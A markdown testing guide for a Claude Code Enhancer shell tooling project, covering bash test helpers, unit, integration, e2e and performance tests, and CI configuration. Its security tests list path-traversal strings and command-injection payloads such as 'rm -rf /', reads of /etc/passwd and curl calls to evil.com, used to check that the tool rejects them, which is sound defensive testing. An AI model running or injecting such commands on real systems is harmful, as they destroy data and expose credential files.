# Testing Guidelines

Comprehensive testing strategy and implementation guide for the Claude Code Enhancer project, covering all aspects of quality assurance and test automation.

## Testing Philosophy

### Core Principles

1. **Real-World Testing**: Tests use actual scripts and environments, not mocks
2. **User Simulation**: Tests simulate actual user interactions and workflows
3. **Safety Validation**: Every test verifies system safety and recovery mechanisms
4. **Complexity Coverage**: Tests cover Simple, Medium, and Complex scenarios
5. **Agent Coordination**: Multi-agent coordination patterns are thoroughly tested
6. **Progressive Quality**: Test quality increases with system complexity

### Testing Strategy

#### **Research → Plan → Test**
Before writing any test:
1. **Research**: Understand the functionality being tested
2. **Plan**: Design comprehensive test scenarios
3. **Test**: Implement with proper coverage and validation

#### **Multi-Layer Testing Approach**
```
Testing Pyramid
┌──────────────────────────────────────────────────────────────────┐
│                        E2E Tests                           │
│                   (Complete Workflows)                    │
├──────────────────────────────────────────────────────────────────┤
│                  Integration Tests                        │
│               (Command Coordination)                      │
├──────────────────────────────────────────────────────────────────┤
│               Component Tests                            │
│            (Individual Commands)                         │
├──────────────────────────────────────────────────────────────────┤
│                   Unit Tests                             │
│               (Individual Functions)                     │
└──────────────────────────────────────────────────────────────────┘
```

## Test Suite Architecture

### Directory Structure

```
test/
├── README.md                        # Test documentation
├── run-tests.sh                    # Main test runner
├── test-config.sh                  # Test configuration
├── utils/                           # Test utilities
│   ├── test-helpers.sh              # Common test functions
│   ├── mock-generators.sh           # Mock data generators
│   ├── assertion-helpers.sh         # Custom assertions
│   └── cleanup-helpers.sh           # Cleanup utilities
├── unit/                           # Unit tests
│   ├── test-merge-functions.sh      # Smart merge unit tests
│   ├── test-template-functions.sh   # Template system tests
│   ├── test-safety-functions.sh     # Safety mechanism tests
│   └── test-agent-functions.sh      # Agent coordination tests
├── integration/                    # Integration tests
│   ├── test-command-workflows.sh    # Command integration
│   ├── test-template-resolution.sh  # Template inheritance
│   ├── test-quality-suite.sh        # Quality command suite
│   └── test-git-integration.sh      # Git workflow tests
├── e2e/                            # End-to-end tests
│   ├── test-fresh-install.sh        # Fresh installation
│   ├── test-merge-conflicts.sh      # Merge conflict resolution
│   ├── test-complete-workflows.sh   # Complete user workflows
│   └── test-recovery-scenarios.sh   # Disaster recovery
├── performance/                    # Performance tests
│   ├── test-large-codebases.sh      # Large project tests
│   ├── test-parallel-execution.sh   # Parallel processing
│   └── benchmark-operations.sh      # Performance benchmarks
├── security/                       # Security tests
│   ├── test-input-validation.sh     # Input sanitization
│   ├── test-permission-handling.sh  # Permission checks
│   └── test-vulnerability-scans.sh  # Security vulnerability tests
├── fixtures/                       # Test data and fixtures
│   ├── mock-templates/              # Test templates
│   ├── sample-projects/             # Sample project structures
│   └── test-data/                   # Test data files
└── reports/                        # Test reports (generated)
    ├── coverage-reports/
    ├── performance-reports/
    └── security-reports/
```

### Test Framework Components

#### Core Test Utilities

```bash
# test/utils/test-helpers.sh

# Test output functions
print_test() {
    echo -e "\033[34m[TEST]\033[0m $1"
}

print_success() {
    echo -e "\033[32m✓\033[0m $1"
}

print_error() {
    echo -e "\033[31m✗\033[0m $1"
}

print_info() {
    echo -e "\033[33m[INFO]\033[0m $1"
}

# Test environment setup
setup_test_environment() {
    local test_name="$1"
    export TEST_NAME="$test_name"
    export TEST_DIR="test-projects/$test_name"
    export TEST_START_TIME=$(date +%s)
    
    # Create isolated test directory
    mkdir -p "$TEST_DIR"
    cd "$TEST_DIR"
    
    # Set up test-specific environment
    export CLAUDE_TEMPLATES_DIR="$(pwd)/../../fixtures/mock-templates"
    export CLAUDE_DEBUG=1
    export CLAUDE_TEST_MODE=1
}

cleanup_test_environment() {
    local test_name="$1"
    local test_dir="test-projects/$test_name"
    
    # Return to test root
    cd ../../..
    
    # Clean up test directory
    if [[ -d "$test_dir" ]]; then
        rm -rf "$test_dir"
    fi
    
    # Log test completion
    local test_end_time=$(date +%s)
    local test_duration=$((test_end_time - TEST_START_TIME))
    print_info "Test completed in ${test_duration}s"
}

# Assertion helpers
assert_file_exists() {
    local file_path="$1"
    local error_message="${2:-File should exist: $file_path}"
    
    if [[ ! -f "$file_path" ]]; then
        print_error "$error_message"
        return 1
    fi
    print_success "File exists: $file_path"
}

assert_directory_exists() {
    local dir_path="$1"
    local error_message="${2:-Directory should exist: $dir_path}"
    
    if [[ ! -d "$dir_path" ]]; then
        print_error "$error_message"
        return 1
    fi
    print_success "Directory exists: $dir_path"
}

assert_command_succeeds() {
    local command="$1"
    local error_message="${2:-Command should succeed: $command}"
    
    if ! eval "$command" >/dev/null 2>&1; then
        print_error "$error_message"
        return 1
    fi
    print_success "Command succeeded: $command"
}

assert_command_fails() {
    local command="$1"
    local error_message="${2:-Command should fail: $command}"
    
    if eval "$command" >/dev/null 2>&1; then
        print_error "$error_message"
        return 1
    fi
    print_success "Command failed as expected: $command"
}

assert_file_contains() {
    local file_path="$1"
    local pattern="$2"
    local error_message="${3:-File should contain pattern: $pattern}"
    
    if ! grep -q "$pattern" "$file_path" 2>/dev/null; then
        print_error "$error_message"
        return 1
    fi
    print_success "File contains pattern: $pattern"
}

assert_git_clean() {
    local error_message="${1:-Git working directory should be clean}"
    
    if ! git diff-index --quiet HEAD 2>/dev/null; then
        print_error "$error_message"
        return 1
    fi
    print_success "Git working directory is clean"
}
```

#### Mock Data Generators

```bash
# test/utils/mock-generators.sh

# Generate mock project structure
generate_mock_project() {
    local project_type="$1"
    local project_size="${2:-small}"
    
    case "$project_type" in
        "javascript")
            generate_javascript_project "$project_size"
            ;;
        "python")
            generate_python_project "$project_size"
            ;;
        "multi-language")
            generate_multi_language_project "$project_size"
            ;;
        *)
            generate_generic_project "$project_size"
            ;;
    esac
}

generate_javascript_project() {
    local size="$1"
    
    # Create package.json
    cat > package.json << 'EOF'
{
  "name": "test-project",
  "version": "1.0.0",
  "scripts": {
    "test": "jest",
    "build": "webpack"
  }
}
EOF
    
    # Create source files based on size
    mkdir -p src
    case "$size" in
        "small")
            echo "console.log('Hello World');" > src/index.js
            echo "export function add(a, b) { return a + b; }" > src/utils.js
            ;;
        "medium")
            for i in {1..10}; do
                echo "export function func$i() { return $i; }" > "src/module$i.js"
            done
            ;;
        "large")
            for i in {1..50}; do
                mkdir -p "src/module$i"
                echo "export function func$i() { return $i; }" > "src/module$i/index.js"
            done
            ;;
    esac
}

generate_python_project() {
    local size="$1"
    
    # Create setup.py
    cat > setup.py << 'EOF'
from setuptools import setup, find_packages

setup(
    name="test-project",
    version="1.0.0",
    packages=find_packages(),
)
EOF
    
    # Create requirements.txt
    echo "requests>=2.25.0" > requirements.txt
    
    # Create source files
    mkdir -p src
    case "$size" in
        "small")
            echo "def main(): print('Hello World')" > src/main.py
            echo "def add(a, b): return a + b" > src/utils.py
            ;;
        "medium")
            for i in {1..10}; do
                echo "def func$i(): return $i" > "src/module$i.py"
            done
            ;;
        "large")
            for i in {1..50}; do
                mkdir -p "src/package$i"
                echo "def func$i(): return $i" > "src/package$i/__init__.py"
            done
            ;;
    esac
}

# Generate mock template files
generate_mock_templates() {
    local template_dir="$1"
    
    mkdir -p "$template_dir/languages"
    mkdir -p "$template_dir/frameworks"
    mkdir -p "$template_dir/commands"
    
    # Base template
    cat > "$template_dir/CLAUDE.md" << 'EOF'
# Mock Base Template

This is a test template for the Claude Code Enhancer.

## Development Guidelines

- Write clean, maintainable code
- Follow established patterns
- Implement comprehensive tests
EOF
    
    # Language templates
    for lang in javascript python go rust; do
        mkdir -p "$template_dir/languages/$lang"
        cat > "$template_dir/languages/$lang/CLAUDE.md" << EOF
# Mock $lang Template

$lang-specific development guidelines and patterns.
EOF
    done
    
    # Framework templates
    for framework in react nextjs django express; do
        mkdir -p "$template_dir/frameworks/$framework"
        cat > "$template_dir/frameworks/$framework/CLAUDE.md" << EOF
# Mock $framework Template

$framework-specific development patterns.
EOF
    done
}
```

## Test Categories and Implementation

### Unit Tests

#### Smart Merge Function Tests

```bash
# test/unit/test-merge-functions.sh

source ../utils/test-helpers.sh

test_merge_function_basic() {
    print_test "Test: Basic merge function"
    
    # Setup
    local source_file="test-source.md"
    local target_file="test-target.md"
    
    echo "# Source Content" > "$source_file"
    echo "# Target Content" > "$target_file"
    
    # Execute merge function
    if merge_claude_md "$source_file" "$target_file"; then
        assert_file_exists "$target_file"
        assert_file_contains "$target_file" "CLAUDE FLOW TEMPLATE"
        print_success "Basic merge function works"
    else
        print_error "Merge function failed"
        return 1
    fi
}

test_merge_function_recursive_detection() {
    print_test "Test: Recursive merge detection"
    
    # Create source with existing template marker
    local source_file="test-recursive.md"
    cat > "$source_file" << 'EOF'
# Custom Content

# ========== CLAUDE FLOW TEMPLATE ==========
# Auto-updated: 2023-12-07 10:00:00

# Template Content
EOF
    
    # Should detect and clean recursive content
    if detect_recursive_merge "$source_file"; then
        print_success "Recursive merge detected correctly"
    else
        print_error "Failed to detect recursive merge"
        return 1
    fi
}

test_merge_function_fingerprinting() {
    print_test "Test: Content fingerprinting for deduplication"
    
    # Create identical template content
    local file1="test-fp1.md"
    local file2="test-fp2.md"
    
    cat > "$file1" << 'EOF'
# ========== CLAUDE FLOW TEMPLATE ==========
# Auto-updated: 2023-12-07 10:00:00

# Identical Template Content
EOF
    
    cat > "$file2" << 'EOF'
# ========== CLAUDE FLOW TEMPLATE ==========
# Auto-updated: 2023-12-07 11:00:00

# Identical Template Content
EOF
    
    local fp1=$(generate_content_fingerprint "$file1")
    local fp2=$(generate_content_fingerprint "$file2")
    
    if [[ "$fp1" == "$fp2" ]]; then
        print_success "Content fingerprinting works correctly"
    else
        print_error "Fingerprints should match: $fp1 != $fp2"
        return 1
    fi
}
```

#### Template System Tests

```bash
# test/unit/test-template-functions.sh

test_template_inheritance_resolution() {
    print_test "Test: Template inheritance resolution"
    
    # Create template hierarchy
    mkdir -p templates/base
    mkdir -p templates/languages/python
    mkdir -p templates/frameworks/django
    
    echo "# Base Template" > templates/base/CLAUDE.md
    echo "# Python Template" > templates/languages/python/CLAUDE.md
    echo "# Django Template" > templates/frameworks/django/CLAUDE.md
    
    # Test inheritance resolution
    local resolved=$(resolve_template_inheritance "templates/frameworks/django/CLAUDE.md")
    
    if [[ -n "$resolved" ]]; then
        print_success "Template inheritance resolved"
    else
        print_error "Template inheritance failed"
        return 1
    fi
}

test_template_parameterization() {
    print_test "Test: Template parameterization"
    
    local template_content='# {{PROJECT_NAME}} Development\n\nVersion: {{VERSION}}'
    local expected_content='# TestProject Development\n\nVersion: 1.0.0'
    
    # Set parameters
    export PROJECT_NAME="TestProject"
    export VERSION="1.0.0"
    
    local result=$(apply_template_parameters "$template_content")
    
    if [[ "$result" == "$expected_content" ]]; then
        print_success "Template parameterization works"
    else
        print_error "Parameterization failed: expected '$expected_content', got '$result'"
        return 1
    fi
}
```

#### Safety Mechanism Tests

```bash
# test/unit/test-safety-functions.sh

test_git_status_validation() {
    print_test "Test: Git status validation"
    
    # Initialize git repo
    git init
    git config user.email "test@example.com"
    git config user.name "Test User"
    
    # Test clean state
    if validate_git_clean_state; then
        print_success "Clean git state detected correctly"
    else
        print_error "Should detect clean git state"
        return 1
    fi
    
    # Create uncommitted changes
    echo "test content" > test-file.txt
    git add test-file.txt
    
    # Test dirty state
    if ! validate_git_clean_state; then
        print_success "Dirty git state detected correctly"
    else
        print_error "Should detect dirty git state"
        return 1
    fi
}

test_backup_creation_and_verification() {
    print_test "Test: Backup creation and verification"
    
    # Create test files
    echo "original content" > test-file.txt
    mkdir -p test-dir
    echo "dir content" > test-dir/file.txt
    
    # Create backup
    local backup_path=$(create_operation_backup "test-backup")
    
    assert_directory_exists "$backup_path"
    assert_file_exists "$backup_path/test-file.txt"
    assert_file_exists "$backup_path/test-dir/file.txt"
    
    # Verify backup integrity
    if verify_backup_integrity "$backup_path"; then
        print_success "Backup creation and verification successful"
    else
        print_error "Backup verification failed"
        return 1
    fi
}

test_rollback_mechanism() {
    print_test "Test: Rollback mechanism"
    
    # Create initial state
    echo "original content" > test-file.txt
    local backup_path=$(create_operation_backup "rollback-test")
    
    # Modify files
    echo "modified content" > test-file.txt
    echo "new content" > new-file.txt
    
    # Execute rollback
    if execute_rollback "$backup_path"; then
        assert_file_contains "test-file.txt" "original content"
        assert_command_fails "test -f new-file.txt"
        print_success "Rollback mechanism works correctly"
    else
        print_error "Rollback mechanism failed"
        return 1
    fi
}
```

### Integration Tests

#### Command Workflow Tests

```bash
# test/integration/test-command-workflows.sh

test_quality_command_integration() {
    print_test "Test: Quality command suite integration"
    
    # Create test project with quality issues
    generate_mock_project "javascript" "medium"
    
    # Introduce quality issues
    echo "console.log('debug');" >> src/index.js  # Debug statement
    echo "var unused = 'test';" >> src/utils.js   # Unused variable
    
    # Run quality suite
    if claude format && claude cleanup && claude verify; then
        print_success "Quality command integration successful"
    else
        print_error "Quality command integration failed"
        return 1
    fi
    
    # Verify improvements
    assert_command_fails "grep -r 'console.log' src/"
    assert_command_fails "grep -r 'var unused' src/"
}

test_milestone_command_integration() {
    print_test "Test: Milestone command integration"
    
    # Initialize git repository
    git init
    git config user.email "test@example.com"
    git config user.name "Test User"
    
    # Create milestone plan
    cat > milestone-plan.md << 'EOF'
# Test Milestone

## Tasks
- [ ] Create basic structure
- [ ] Implement core functionality
- [ ] Add tests
- [ ] Update documentation
EOF
    
    # Execute milestone workflow
    if claude milestone plan milestone-plan.md && \
       claude milestone execute && \
       claude milestone status; then
        print_success "Milestone command integration successful"
    else
        print_error "Milestone command integration failed"
        return 1
    fi
}

test_git_integration_workflow() {
    print_test "Test: Git integration workflow"
    
    # Initialize repository
    git init
    git config user.email "test@example.com"
    git config user.name "Test User"
    
    # Create initial commit
    echo "# Test Project" > README.md
    git add README.md
    git commit -m "Initial commit"
    
    # Test git workflow commands
    if claude git branch feature/test-feature && \
       claude git commit "Add test feature" && \
       claude git status; then
        print_success "Git integration workflow successful"
    else
        print_error "Git integration workflow failed"
        return 1
    fi
    
    # Verify git state
    assert_command_succeeds "git branch | grep -q feature/test-feature"
}
```

#### Template Resolution Tests

```bash
# test/integration/test-template-resolution.sh

test_complex_template_inheritance() {
    print_test "Test: Complex template inheritance resolution"
    
    # Create complex template hierarchy
    setup_complex_template_hierarchy
    
    # Test resolution for multiple inheritance paths
    local resolved_js=$(resolve_template "javascript" "react")
    local resolved_py=$(resolve_template "python" "django")
    
    assert_file_contains "$resolved_js" "JavaScript"
    assert_file_contains "$resolved_js" "React"
    assert_file_contains "$resolved_py" "Python"
    assert_file_contains "$resolved_py" "Django"
    
    print_success "Complex template inheritance works"
}

test_template_conflict_resolution() {
    print_test "Test: Template conflict resolution"
    
    # Create conflicting templates
    create_conflicting_templates
    
    # Resolution should prioritize more specific templates
    local resolved=$(resolve_template_conflicts "javascript" "react")
    
    # Framework-specific content should override language content
    assert_file_contains "$resolved" "React-specific"
    
    print_success "Template conflict resolution works"
}
```

### End-to-End Tests

#### Complete Workflow Tests

```bash
# test/e2e/test-complete-workflows.sh

test_fresh_project_setup_workflow() {
    print_test "Test: Fresh project setup workflow"
    
    # Simulate fresh project setup
    mkdir -p fresh-project
    cd fresh-project
    
    # Initialize with Claude Flow
    echo "y" | ../../../install-claude-flow.sh
    
    # Verify complete setup
    assert_file_exists "CLAUDE.md"
    assert_directory_exists ".claude/commands"
    assert_file_exists ".claude/settings.local.json"
    
    # Test command execution
    assert_command_succeeds "claude --help"
    
    print_success "Fresh project setup workflow complete"
    
    cd ..
}

test_development_lifecycle_workflow() {
    print_test "Test: Complete development lifecycle"
    
    # Setup project
    generate_mock_project "javascript" "medium"
    initialize_claude_flow
    
    # Development workflow
    claude git branch feature/new-feature
    claude milestone plan development.md
    claude format
    claude cleanup
    claude test unit
    claude quality verify
    claude git commit "Implement new feature"
    claude milestone update
    
    # Verify workflow completion
    assert_git_clean
    assert_command_succeeds "claude milestone status | grep -q completed"
    
    print_success "Development lifecycle workflow complete"
}
```

#### Recovery Scenario Tests

```bash
# test/e2e/test-recovery-scenarios.sh

test_interrupted_operation_recovery() {
    print_test "Test: Interrupted operation recovery"
    
    # Start operation that will be interrupted
    generate_mock_project "python" "large"
    
    # Simulate operation interruption
    timeout 5s claude format --comprehensive &
    local pid=$!
    sleep 2
    kill -INT $pid
    
    # Verify recovery capability
    if claude recover --last-operation; then
        print_success "Operation recovery successful"
    else
        print_error "Operation recovery failed"
        return 1
    fi
    
    # Verify system integrity
    assert_git_clean
    assert_command_succeeds "claude verify --quick"
}

test_corruption_detection_and_recovery() {
    print_test "Test: Corruption detection and recovery"
    
    # Create backup point
    local backup_id=$(claude backup create "corruption-test")
    
    # Simulate file corruption
    echo "corrupted content" > CLAUDE.md
    rm -rf .claude/commands/git
    
    # Detection should trigger
    if claude verify --integrity; then
        print_error "Should detect corruption"
        return 1
    fi
    
    # Recovery should restore integrity
    if claude recover --backup "$backup_id"; then
        assert_file_exists "CLAUDE.md"
        assert_directory_exists ".claude/commands/git"
        print_success "Corruption recovery successful"
    else
        print_error "Corruption recovery failed"
        return 1
    fi
}
```

### Performance Tests

#### Large Codebase Tests

```bash
# test/performance/test-large-codebases.sh

test_large_codebase_performance() {
    print_test "Test: Large codebase performance"
    
    # Generate large test project
    generate_mock_project "multi-language" "large"
    
    # Measure operation performance
    local start_time=$(date +%s.%N)
    
    claude format --comprehensive
    claude cleanup --aggressive
    claude verify --comprehensive
    
    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $start_time" | bc)
    
    # Performance threshold (adjust based on requirements)
    local max_duration=300  # 5 minutes
    
    if (( $(echo "$duration < $max_duration" | bc -l) )); then
        print_success "Large codebase processed in ${duration}s (under ${max_duration}s limit)"
    else
        print_error "Performance too slow: ${duration}s (limit: ${max_duration}s)"
        return 1
    fi
}

test_parallel_execution_performance() {
    print_test "Test: Parallel execution performance"
    
    generate_mock_project "javascript" "large"
    
    # Test with different parallelism levels
    for parallel in 1 2 4 8; do
        export CLAUDE_MAX_PARALLEL=$parallel
        
        local start_time=$(date +%s.%N)
        claude quality --all
        local end_time=$(date +%s.%N)
        
        local duration=$(echo "$end_time - $start_time" | bc)
        print_info "Parallel level $parallel: ${duration}s"
        
        # Store for comparison
        echo "$parallel:$duration" >> performance-results.txt
    done
    
    # Verify parallelism improves performance
    local serial_time=$(grep "^1:" performance-results.txt | cut -d: -f2)
    local parallel_time=$(grep "^4:" performance-results.txt | cut -d: -f2)
    
    if (( $(echo "$parallel_time < $serial_time" | bc -l) )); then
        print_success "Parallel execution improves performance"
    else
        print_info "No significant performance improvement from parallelism"
    fi
}
```

### Security Tests

#### Input Validation Tests

```bash
# test/security/test-input-validation.sh

test_path_traversal_prevention() {
    print_test "Test: Path traversal attack prevention"
    
    # Attempt path traversal attacks
    local malicious_paths=(
        "../../../etc/passwd"
        "..\\..\\..\\windows\\system32"
        "/etc/passwd"
        "./../../sensitive-file"
    )
    
    for path in "${malicious_paths[@]}"; do
        if claude template install "$path" 2>/dev/null; then
            print_error "Path traversal attack succeeded: $path"
            return 1
        fi
    done
    
    print_success "Path traversal attacks prevented"
}

test_command_injection_prevention() {
    print_test "Test: Command injection prevention"
    
    # Attempt command injection
    local malicious_inputs=(
        "; rm -rf /"
        "&& cat /etc/passwd"
        "| curl evil.com"
        "`curl evil.com`"
        "$(rm -rf /)"
    )
    
    for input in "${malicious_inputs[@]}"; do
        if claude git commit "Test commit$input" 2>/dev/null; then
            print_error "Command injection succeeded: $input"
            return 1
        fi
    done
    
    print_success "Command injection attacks prevented"
}
```

## Test Automation and CI/CD Integration

### Continuous Integration Setup

#### GitHub Actions Configuration

```yaml
# .github/workflows/test-suite.yml
name: Comprehensive Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        bash-version: [4.4, 5.0, 5.1]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Install Bash ${{ matrix.bash-version }}
      run: |
        sudo apt-get update
        sudo apt-get install -y bash=${{ matrix.bash-version }}*
    
    - name: Run Unit Tests
      run: |
        cd test
        ./run-tests.sh --category unit
    
    - name: Upload Test Results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: unit-test-results-${{ matrix.bash-version }}
        path: test/reports/

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run Integration Tests
      run: |
        cd test
        ./run-tests.sh --category integration
    
    - name: Upload Integration Results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: integration-test-results
        path: test/reports/

  e2e-tests:
    runs-on: ${{ matrix.os }}
    needs: integration-tests
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run E2E Tests
      run: |
        cd test
        ./run-tests.sh --category e2e
    
    - name: Upload E2E Results
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: e2e-test-results-${{ matrix.os }}
        path: test/reports/

  performance-tests:
    runs-on: ubuntu-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run Performance Tests
      run: |
        cd test
        ./run-tests.sh --category performance
    
    - name: Upload Performance Results
      uses: actions/upload-artifact@v3
      with:
        name: performance-test-results
        path: test/reports/performance/

  security-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Run Security Tests
      run: |
        cd test
        ./run-tests.sh --category security
    
    - name: Upload Security Results
      uses: actions/upload-artifact@v3
      with:
        name: security-test-results
        path: test/reports/security/

  test-report:
    runs-on: ubuntu-latest
    needs: [unit-tests, integration-tests, e2e-tests, performance-tests, security-tests]
    if: always()
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Download All Artifacts
      uses: actions/download-artifact@v3
    
    - name: Generate Combined Report
      run: |
        ./test/utils/generate-combined-report.sh
    
    - name: Upload Combined Report
      uses: actions/upload-artifact@v3
      with:
        name: combined-test-report
        path: test-report.html
```

### Local Development Testing

#### Pre-commit Hook Integration

```bash
# .git/hooks/pre-commit
#!/bin/bash

set -e

echo "Running pre-commit tests..."

# Run quick test suite
cd test
if ! ./run-tests.sh --quick; then
    echo "Tests failed. Commit aborted."
    exit 1
fi

# Run code quality checks
if ! ./run-tests.sh --category unit --pattern "quality"; then
    echo "Quality checks failed. Commit aborted."
    exit 1
fi

echo "All pre-commit tests passed."
```

#### Development Test Runner

```bash
# test/dev-test-runner.sh
#!/bin/bash

# Development-focused test runner
# Usage: ./dev-test-runner.sh [options]

set -e

# Configuration
DEFAULT_CATEGORIES=("unit" "integration")
VERBOSE=false
FAIL_FAST=true
PARALLEL=true

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --all)
            CATEGORIES=("unit" "integration" "e2e")
            shift
            ;;
        --category)
            CATEGORIES=("$2")
            shift 2
            ;;
        --verbose)
            VERBOSE=true
            shift
            ;;
        --no-fail-fast)
            FAIL_FAST=false
            shift
            ;;
        --sequential)
            PARALLEL=false
            shift
            ;;
        --help)
            echo "Usage: $0 [options]"
            echo "Options:"
            echo "  --all              Run all test categories"
            echo "  --category <cat>   Run specific category"
            echo "  --verbose          Enable verbose output"
            echo "  --no-fail-fast    Continue on first failure"
            echo "  --sequential       Disable parallel execution"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            exit 1
            ;;
    esac
done

# Set defaults
CATEGORIES=${CATEGORIES:-${DEFAULT_CATEGORIES[@]}}

# Configure environment
if $VERBOSE; then
    export CLAUDE_DEBUG=1
    export CLAUDE_VERBOSE=1
fi

if $FAIL_FAST; then
    export CLAUDE_FAIL_FAST=1
fi

if $PARALLEL; then
    export CLAUDE_PARALLEL_TESTS=4
fi

# Run tests
for category in "${CATEGORIES[@]}"; do
    echo "Running $category tests..."
    
    if ! ./run-tests.sh --category "$category"; then
        if $FAIL_FAST; then
            echo "Tests failed in category: $category"
            exit 1
        else
            echo "Tests failed in category: $category (continuing...)"
        fi
    fi
done

echo "Development tests completed."
```

## Test Quality and Maintenance

### Test Coverage Requirements

#### Coverage Targets
- **Unit Tests**: 90%+ function coverage
- **Integration Tests**: 80%+ workflow coverage
- **E2E Tests**: 70%+ user scenario coverage
- **Security Tests**: 100% attack vector coverage

#### Coverage Tracking

```bash
# test/utils/coverage-tracker.sh
#!/bin/bash

generate_coverage_report() {
    local test_category="$1"
    local coverage_file="reports/coverage-$test_category.txt"
    
    # Track function coverage
    local total_functions=$(grep -r "^function " ../ --include="*.sh" | wc -l)
    local tested_functions=$(grep -r "test_.*function" . | wc -l)
    local function_coverage=$((tested_functions * 100 / total_functions))
    
    # Track file coverage
    local total_files=$(find ../ -name "*.sh" | wc -l)
    local tested_files=$(find . -name "test-*.sh" | wc -l)
    local file_coverage=$((tested_files * 100 / total_files))
    
    # Generate report
    cat > "$coverage_file" << EOF
Test Coverage Report - $test_category
Generated: $(date)

Function Coverage: $function_coverage% ($tested_functions/$total_functions)
File Coverage: $file_coverage% ($tested_files/$total_files)

Coverage Breakdown:
EOF
    
    # Add detailed breakdown
    generate_detailed_coverage >> "$coverage_file"
}
```

### Test Maintenance Guidelines

#### Regular Maintenance Tasks

1. **Weekly**: Review and update failing tests
2. **Monthly**: Analyze test performance and optimize slow tests
3. **Quarterly**: Review test coverage and add missing tests
4. **Semi-annually**: Refactor test utilities and remove obsolete tests

#### Test Refactoring Standards

```bash
# Example: Refactoring repetitive test setup

# Before: Repetitive setup in each test
test_function_a() {
    mkdir -p test-dir
    cd test-dir
    echo "content" > file.txt
    # test logic
    cd ..
    rm -rf test-dir
}

test_function_b() {
    mkdir -p test-dir
    cd test-dir
    echo "content" > file.txt
    # test logic
    cd ..
    rm -rf test-dir
}

# After: Shared setup utility
setup_standard_test_environment() {
    mkdir -p test-dir
    cd test-dir
    echo "content" > file.txt
}

cleanup_standard_test_environment() {
    cd ..
    rm -rf test-dir
}

test_function_a() {
    setup_standard_test_environment
    # test logic
    cleanup_standard_test_environment
}

test_function_b() {
    setup_standard_test_environment
    # test logic
    cleanup_standard_test_environment
}
```

## Debugging and Troubleshooting Tests

### Debug Mode Testing

```bash
# Enable comprehensive debugging
export CLAUDE_DEBUG=1
export CLAUDE_VERBOSE=1
export CLAUDE_TEST_DEBUG=1

# Run specific test with debugging
bash -x test/unit/test-specific-function.sh

# Capture debug output
test/run-tests.sh --category unit 2>&1 | tee debug-output.log
```

### Test Failure Analysis

```bash
# test/utils/failure-analyzer.sh
#!/bin/bash

analyze_test_failure() {
    local test_name="$1"
    local failure_log="$2"
    
    echo "Analyzing test failure: $test_name"
    
    # Extract error patterns
    local errors=$(grep -i "error\|fail\|exception" "$failure_log")
    echo "Error patterns found:"
    echo "$errors"
    
    # Check environment issues
    check_environment_issues "$failure_log"
    
    # Check resource issues
    check_resource_issues "$failure_log"
    
    # Generate suggestions
    generate_failure_suggestions "$test_name" "$errors"
}

check_environment_issues() {
    local log_file="$1"
    
    if grep -q "Permission denied" "$log_file"; then
        echo "Suggestion: Check file permissions"
    fi
    
    if grep -q "Command not found" "$log_file"; then
        echo "Suggestion: Check PATH and installed tools"
    fi
    
    if grep -q "No space left" "$log_file"; then
        echo "Suggestion: Check disk space"
    fi
}
```

## Best Practices Summary

### Writing Effective Tests

1. **Test Behavior, Not Implementation**: Focus on what the system does, not how
2. **Use Descriptive Names**: Test names should clearly describe what's being tested
3. **Follow AAA Pattern**: Arrange, Act, Assert
4. **Keep Tests Independent**: Each test should be able to run in isolation
5. **Test Edge Cases**: Include boundary conditions and error scenarios
6. **Mock External Dependencies**: Use controlled test environments
7. **Verify Cleanup**: Ensure tests clean up after themselves

### Test Organization

1. **Group Related Tests**: Organize tests by functionality or component
2. **Use Consistent Structure**: Follow established patterns across test files
3. **Share Common Utilities**: Avoid code duplication in test helpers
4. **Document Test Purpose**: Include clear comments explaining test goals
5. **Maintain Test Data**: Keep test fixtures up to date and relevant

### Performance Considerations

1. **Optimize Slow Tests**: Identify and improve tests that take too long
2. **Use Parallel Execution**: Run independent tests concurrently
3. **Minimize I/O Operations**: Reduce file system and network operations
4. **Cache Test Data**: Reuse expensive setup operations when possible
5. **Profile Test Execution**: Regularly analyze test performance

---

**Next**: [Quality Standards](./quality-standards.md) - Code quality and review processes

**See Also**:
- [Development Setup](./development-setup.md) - Environment setup for testing
- [Contributing Guidelines](./contributing-guidelines.md) - Contribution requirements
- [Debugging Guide](./debugging-guide.md) - Advanced debugging techniques